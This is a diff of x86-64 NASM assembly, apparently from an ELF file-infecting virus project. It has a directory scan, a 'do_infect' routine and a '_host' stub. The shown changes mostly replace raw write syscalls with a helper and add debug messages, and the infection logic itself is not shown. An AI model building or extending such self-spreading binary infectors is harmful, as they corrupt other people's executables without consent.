@@ -65,22 +65,22 @@ ET_CORE:    equ 4
 ET_NUM:     equ 5
 
 struc	stat
-    .st_dev			resq	1	; ID of device containing file
-    .__pad1			resw	1	; Padding
-    .st_ino			resq	1	; Inode number
-    .st_mode		resd	1	; File type and mode
-    .st_nlink		resq	1	; Number of hard links
-    .st_uid			resd	1	; User ID of owner
-    .st_gid			resd	1	; Group ID of owner
-    .st_rdev		resq	1	; Device ID (if special file)
-    .__pad2			resw	1	; Padding
-    .st_size		resq	1	; Total size, in bytes
-    .st_blksize		resq	1	; Block size for filesystem I/O
-    .st_blocks		resq	1	; Number of 512B blocks allocated
-    .st_atim		resq	2	; Time of last access
-    .st_mtim		resq	2	; Time of last modification
-    .st_ctim		resq	2	; Time of last status change
-    .__unused		resq	3	; Unused
+    .st_dev			resq	1
+    .__pad1			resw	1
+    .st_ino			resq	1
+    .st_mode		resd	1
+    .st_nlink		resq	1
+    .st_uid			resd	1
+    .st_gid			resd	1
+    .st_rdev		resq	1
+    .__pad2			resw	1
+    .st_size		resq	1
+    .st_blksize		resq	1
+    .st_blocks		resq	1
+    .st_atim		resq	2
+    .st_mtim		resq	2
+    .st_ctim		resq	2
+    .__unused		resq	3
 endstruc
 
 struc Elf64_Ehdr
@@ -171,11 +171,9 @@ _start:
 
         mov data(dir_fd), rax
 
-        mov rax, SYS_WRITE
-        lea rsi, [rel directory_msg]
-        mov rdi, 1
-        mov rdx, 4
-        syscall
+       lea rdi, [rel directory_msg]
+       mov rsi, 4
+       call write
     .read_directory:
         mov rdx, DIRENT_ARR_SIZE
         lea rsi, data(dirent_array)
@@ -187,11 +185,10 @@ _start:
         xor r13, r13 ; offset counter for directory entries
         mov r12, rax ; number of bytes read by getdents
     .process_file:
-        mov rax, SYS_WRITE
-        mov rdi, 1
-        lea rsi, [rel file_msg]
-        mov rdx, 5
-        syscall
+        lea rdi, [rel file_msg]
+        mov rsi, 5
+        call write
+
         lea rdi, data(dirent_array)
         add rdi, r13
         ; d_type is the last field in the dirent struct, which has
@@ -209,6 +206,10 @@ _start:
         jl .process_file
         jmp .read_directory
     .close_directory:
+        lea rdi, [rel close_msg]
+        mov rsi, 6
+        call write
+
         mov rdi, data(dir_fd)
         mov rax, SYS_CLOSE
         syscall
@@ -248,7 +249,7 @@ do_infect:
         movsb
         cmp BYTE [rsi - 1], 0
         jnz .file_name
-    jmp exit
+    ret
 
 ; in: -
 ; out: base_address (rax)
@@ -368,6 +369,8 @@ host_msg:
     db "host", 10
 file_msg:
     db "file", 10
+close_msg:
+    db "close", 10
 _end:
 
 _host:
@@ -375,11 +378,9 @@ _host:
     push rdi
     push rsi
     push rdx
-    mov rax, SYS_WRITE
-    mov rdi, 1
-    lea rsi, [rel host_msg]
-    mov rdx, 5
-    syscall
+    lea rdi, [rel host_msg]
+    mov rsi, 5
+    call write
     pop rdx
     pop rsi
     pop rdi
